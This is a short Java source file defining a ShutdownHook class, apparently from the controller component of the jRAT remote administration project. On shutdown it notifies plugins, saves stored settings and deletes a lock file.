package jrat.controller;

import jrat.common.Logger;
import jrat.controller.settings.AbstractStorable;
import jrat.controller.settings.Settings;
import jrat.api.events.Event;
import jrat.api.events.EventType;
import jrat.api.events.OnDisableEvent;

public class ShutdownHook implements Runnable {

	@Override
	public void run() {
		Logger.log("Shutting down...");
		
		OnDisableEvent event = new OnDisableEvent();
		for (Event e : Event.getHandler().getEvents(EventType.EVENT_PLUGIN_DISABLE)) {
			try {
				e.perform(event);
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}

		AbstractStorable.saveAllGlobals();

		try {
			Settings.getGlobal().save();
		} catch (Exception e) {
			e.printStackTrace();
		}

		Globals.getLockFile().delete();
	}

}
